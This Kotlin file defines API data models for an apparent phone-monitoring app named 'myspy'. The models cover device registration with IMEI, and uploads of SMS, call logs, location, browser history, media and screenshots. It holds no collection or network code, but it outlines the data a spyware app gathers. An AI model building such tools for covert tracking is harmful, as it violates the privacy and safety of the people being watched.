package com.myspy.android.data.remote.models

import com.google.gson.annotations.SerializedName

/**
 * API Data Models
 * @author Michael KOJDL
 * @version 1.0.0
 */

// Register Device
data class RegisterDeviceRequest(
    @SerializedName("manufacturer") val manufacturer: String,
    @SerializedName("model") val model: String,
    @SerializedName("serial") val serial: String,
    @SerializedName("os") val os: String,
    @SerializedName("os_version") val osVersion: String,
    @SerializedName("imei") val imei: String,
    @SerializedName("uuid") val uuid: String
)

data class RegisterDeviceResponse(
    @SerializedName("result") val result: String,
    @SerializedName("uuid") val uuid: String,
    @SerializedName("api_key") val apiKey: String,
    @SerializedName("timestamp") val timestamp: String,
    @SerializedName("version") val version: String
)

// SMS
data class SmsData(
    @SerializedName("message_type") val messageType: String,
    @SerializedName("address") val address: String,
    @SerializedName("body") val body: String,
    @SerializedName("timestamp") val timestamp: String,
    @SerializedName("thread_id") val threadId: Int?
)

// Calls
data class CallData(
    @SerializedName("call_type") val callType: String,
    @SerializedName("number") val number: String,
    @SerializedName("duration") val duration: Int,
    @SerializedName("timestamp") val timestamp: String,
    @SerializedName("contact_name") val contactName: String? = null
)

// Location
data class LocationData(
    @SerializedName("latitude") val latitude: Double,
    @SerializedName("longitude") val longitude: Double,
    @SerializedName("accuracy") val accuracy: Float?,
    @SerializedName("altitude") val altitude: Double?,
    @SerializedName("speed") val speed: Float?,
    @SerializedName("address") val address: String?,
    @SerializedName("timestamp") val timestamp: String
)

// Apps
data class AppData(
    @SerializedName("package_name") val packageName: String,
    @SerializedName("app_name") val appName: String,
    @SerializedName("version_name") val versionName: String,
    @SerializedName("version_code") val versionCode: String,
    @SerializedName("is_system_app") val isSystemApp: Boolean,
    @SerializedName("install_time") val installTime: String,
    @SerializedName("update_time") val updateTime: String
)

// Internet/Browser
data class BrowserHistoryData(
    @SerializedName("url") val url: String,
    @SerializedName("title") val title: String?,
    @SerializedName("visit_count") val visitCount: Int,
    @SerializedName("timestamp") val timestamp: String
)

// Media
data class MediaData(
    @SerializedName("media_type") val mediaType: String, // PHOTO, VIDEO, AUDIO
    @SerializedName("file_path") val filePath: String,
    @SerializedName("file_name") val fileName: String,
    @SerializedName("file_size") val fileSize: Long,
    @SerializedName("mime_type") val mimeType: String?,
    @SerializedName("width") val width: Int?,
    @SerializedName("height") val height: Int?,
    @SerializedName("duration") val duration: Long?,
    @SerializedName("timestamp") val timestamp: String
)

// Screenshots
data class ScreenshotData(
    @SerializedName("file_path") val filePath: String,
    @SerializedName("file_name") val fileName: String,
    @SerializedName("file_size") val fileSize: Long,
    @SerializedName("width") val width: Int,
    @SerializedName("height") val height: Int,
    @SerializedName("timestamp") val timestamp: String
)

// Generic Response
data class ApiResponse(
    @SerializedName("result") val result: String,
    @SerializedName("created") val created: Int? = null,
    @SerializedName("timestamp") val timestamp: String? = null,
    @SerializedName("message") val message: Any? = null
)
